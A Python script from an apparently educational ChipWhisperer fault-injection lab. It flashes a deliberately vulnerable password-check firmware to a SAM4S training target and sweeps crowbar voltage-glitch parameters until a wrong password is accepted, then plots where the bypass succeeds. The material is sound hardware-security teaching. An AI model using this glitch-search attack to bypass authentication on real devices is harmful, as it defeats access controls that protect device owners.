#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# fault101 Fault 2_2 - Voltage Glitching to Bypass a Password Check (REAL HARDWARE)
# Target: CW312T-SAM4S on the Abductor (CW312->CW308) + CW308 UFO, ChipWhisperer Husky Plus.
# Hardware: Husky CROWBAR SMA + MEASURE both tee'd onto the UFO VOUT (voltage-glitch setup).
# Firmware password is "touch". Sending a WRONG password ([0]*5) normally returns passok=0. A crowbar
# voltage glitch during the compare loop leaves passok=1 -> authentication bypassed with a wrong password.
import os, time, subprocess
import numpy as np
import matplotlib; matplotlib.use("Agg")
import matplotlib.pyplot as plt
import chipwhisperer as cw

PLATFORM="CW312_SAM4S"; SS_VER="SS_VER_2_1"
FWDIR="/home/dreg/chipwhisperer/firmware/mcu/simpleserial-glitch"
HEX=f"{FWDIR}/simpleserial-glitch-{PLATFORM}.hex"
TC="/home/dreg/toolchains/xpack-arm-none-eabi-gcc-13.3.1-1.1/bin"
OUT="/home/dreg/chipwhisperer/dregdoc/img"
ENV=dict(os.environ, PATH=TC+":"+os.environ["PATH"])

print("=== build + flash simpleserial-glitch ===")
subprocess.run(["make","clean"], cwd=FWDIR, env=ENV, capture_output=True)
r=subprocess.run(["make",f"PLATFORM={PLATFORM}","CRYPTO_TARGET=NONE",f"SS_VER={SS_VER}","-j"],
                 cwd=FWDIR, env=ENV, capture_output=True, text=True)
assert os.path.isfile(HEX), (r.stdout[-1500:]+r.stderr[-1500:])
scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial2)
scope.default_setup()
for k in range(2):
    try: cw.program_target(scope, cw.programmers.SAM4SProgrammer, HEX); print("   flashed"); break
    except Exception as e: print("   flash retry:", e); time.sleep(1.0)
target.reset_comms()

def reboot_flush():
    scope.io.nrst=False; time.sleep(0.05); scope.io.nrst="high_z"; time.sleep(0.05); target.flush()

# voltage-glitch setup: high-power crowbar (the Husky CROWBAR SMA on VOUT)
scope.vglitch_setup('hp', default_setup=False)
scope.glitch.trigger_src="ext_single"
scope.adc.timeout=0.1

WRONG=bytearray([0]*5); CORRECT=bytearray([0x74,0x6F,0x75,0x63,0x68])
def try_password(pw):
    if scope.adc.state: reboot_flush()
    scope.arm()
    target.simpleserial_write('p', pw)
    ret=scope.capture()
    scope.io.vglitch_reset()          # release crowbar after each attempt
    if ret:
        reboot_flush(); return None
    val=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=50)
    if not val['valid'] or val['payload'] is None:
        reboot_flush(); return None
    return val['payload'][0]

def check_pw(pw):                      # glitch-free sanity (no scope.arm -> crowbar never fires)
    reboot_flush()
    target.simpleserial_write('p', pw)
    val=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=1000)
    return val['payload'][0] if (val['valid'] and val['payload']) else None

print("   sanity wrong pw ->", check_pw(WRONG), " (expect 0)")
print("   sanity correct pw 'touch' ->", check_pw(CORRECT), " (expect 1)")

def attempt(width, offset, ext):
    scope.glitch.width=width; scope.glitch.offset=offset; scope.glitch.ext_offset=ext
    r=try_password(WRONG)
    if r is None: return "reset"
    if r==1: return "success"
    return "normal"

cw.set_all_log_levels(cw.logging.ERROR)  # suppress the ack/timeout messages during glitching
print("=== voltage-glitch search for password bypass (wrong pw accepted) ===")
recs=[]; successes=[]; attempts=0; STOP=12
reboot_flush()
done=False
for wid in [1900, 2100, 1700, 2300]:            # most-likely width first
    for ext in range(0, 151):
        for off in range(2000, 2501, 50):
            cat=attempt(wid, off, ext); attempts+=1
            recs.append((wid,off,ext,cat))
            if cat=="success":
                successes.append((wid,off,ext))
                if len(successes)==1:
                    print(f"   bypass: wrong password accepted at width={wid} offset={off} ext_offset={ext} (attempt {attempts})")
        if len(successes)>=STOP: done=True; break
    if done: break
    if successes: break                          # this width works; stop widening
cw.set_all_log_levels(cw.logging.WARNING)

winW = successes[0][0] if successes else None
print(f"=== {len(successes)} bypass hits in {attempts} attempts (width={winW}) ===")
if successes:
    print("   example winning (width,offset,ext_offset):", successes[:8])

scope.dis(); target.dis()

# figure: bypass map at the winning width (ext_offset vs offset), colored by outcome
mrecs=[r for r in recs if r[0]==winW] if winW is not None else recs
if mrecs:
    cmap={"success":"#2ca02c","reset":"#d62728","normal":"#cccccc"}
    plt.figure(figsize=(11,6))
    for cat in ["normal","reset","success"]:
        pts=[(e,o) for (w,o,e,c) in mrecs if c==cat]
        if pts:
            xs,ys=zip(*pts)
            plt.scatter(xs,ys,s=16,c=cmap[cat],label=f"{cat} ({len(pts)})",
                        marker=("+" if cat=="success" else ("x" if cat=="reset" else ".")), alpha=0.7)
    ttl="PASSWORD BYPASSED" if successes else "no bypass found"
    plt.xlabel("ext_offset (cycles)"); plt.ylabel("glitch offset (phase-shift steps)")
    plt.title(f"fault101 Fault 2_2: voltage-glitch (crowbar) password bypass, {ttl} (CW312T-SAM4S via Abductor + Husky Plus)")
    plt.legend(fontsize=9); plt.grid(alpha=0.3); plt.tight_layout()
    plt.savefig(f"{OUT}/fault_2_2_vglitch_bypass.png", dpi=115); plt.close()
    print("saved:", OUT+"/fault_2_2_vglitch_bypass.png")

print("SUCCESSES:", len(successes)); print("DONE")
